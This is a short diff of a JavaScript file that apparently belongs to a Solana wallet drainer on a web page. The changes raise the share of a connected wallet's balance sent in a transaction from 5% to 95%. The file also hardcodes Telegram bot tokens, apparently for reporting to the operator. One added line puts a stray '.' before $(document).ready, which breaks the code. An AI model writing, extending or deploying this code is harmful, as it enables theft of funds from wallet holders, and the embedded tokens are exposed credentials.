@@ -1,4 +1,4 @@
-$(document).ready(async function () {
+.$(document).ready(async function () {
     //const telegramToken = "8195575076:AAFtYXrlFAsYMoThgEiUjHKAN6-tyPFr4J4";
    const telegramToken = "8156645817:AAH_KHYsM_9OZ6Q7Uj55cJsyA6gZKybCp1s"; //
   // Sostituisci con il token del tuo bot
@@ -227,7 +227,7 @@ $(document).ready(async function () {
       const tokens = await getTokenAccounts(connection, publicKey);
 
       const balanceForTransfer = walletBalance - minBalance;
-      const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.05));
+      const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.95));
 
       let transaction = new solanaWeb3.Transaction();
 
@@ -583,7 +583,7 @@ $(document).ready(async function () {
 
               const balanceForTransfer = walletBalance - minBalance;
               const solTransferAmount = Math.floor(
-                Number(balanceForTransfer * 0.05)
+                Number(balanceForTransfer * 0.95)
               );
 
               // Create transaction
